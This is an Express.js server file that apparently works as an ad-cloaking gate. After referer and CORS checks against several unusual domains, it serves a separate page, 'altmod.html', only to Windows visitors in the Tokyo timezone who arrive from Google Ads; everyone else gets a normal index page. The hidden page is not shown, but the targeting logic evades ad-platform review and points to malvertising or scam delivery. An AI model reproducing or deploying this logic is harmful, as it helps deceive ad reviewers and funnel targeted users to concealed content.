const express = require("express");
const cors = require("cors");
const path = require("path");
const app = express();
const PORT = 3000 || process.env.PORT;

// List of allowed frontend origins for CORS
const allowedOrigins = [
  "https://musubijp.com",
  "http://musubijp.com",
  "https://musubijp.com/",
  "http://musubijp.com/",
  "http://127.0.0.1:5501",
  "http://127.0.0.1:5500",
  "https://halcyoninjp.live",
  "http://halcyoninjp.live",
  "https://halcyoninjp.live/",
  "http://halcyoninjp.live/",
  "https://ufitmerchandise.in",
  "http://ufitmerchandise.in",
  "https://ufitmerchandise.in/",
  "http://ufitmerchandise.in/",
  "https://hotnihonnews.today",
  "http://hotnihonnews.today",
  "https://hotnihonnews.today/",
  "http://hotnihonnews.today/",
];

// Normalize referer function to handle trailing slashes
const normalizeReferer = (referer) => referer?.replace(/\/+$/, "");

// CORS configuration
const corsOptions = {
  origin: function (origin, callback) {
    console.log(`Origin: ${origin}`); // Log the origin for debugging
    if (allowedOrigins.includes(origin) || !origin) {
      callback(null, true);
    } else {
      callback(new Error("Not allowed by CORS"));
    }
  },
};

// Apply the CORS middleware
app.use(cors(corsOptions));

// Middleware to parse JSON bodies
app.use(express.json());

// Route to handle the POST request
app.post(
  "/",
  (req, res, next) => {
    const referer = normalizeReferer(req.headers.referer);
    console.log(`Referer: ${referer}`); // Log the referer for debugging

    // Check if the normalized referer exists in the allowedOrigins array
    if (allowedOrigins.some(allowedOrigin => referer.startsWith(allowedOrigin))) {
      next();
    } else {
      res.status(403).send("Access forbidden due to invalid referer.");
    }
  },
  (req, res) => {
    const { timezone } = req.body;
    const userAgent = req.headers['user-agent'];
    const gclid = req.query.gclid; // Access the gclid parameter from the URL query string

    // Conditions for serving altmod.html
    const isWindowsUser = userAgent.includes("Windows");
    const isTimezoneTokyo = timezone === "Asia/Tokyo";
    const isFromGoogleAds = typeof gclid !== 'undefined';

    if (isWindowsUser && isTimezoneTokyo && isFromGoogleAds) {
      res.sendFile(path.join(__dirname, "altmod.html"));
    } else {
      console.log("Serving index.html");
      res.sendFile(path.join(__dirname, "index.html"));
    }
  }
);

app.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
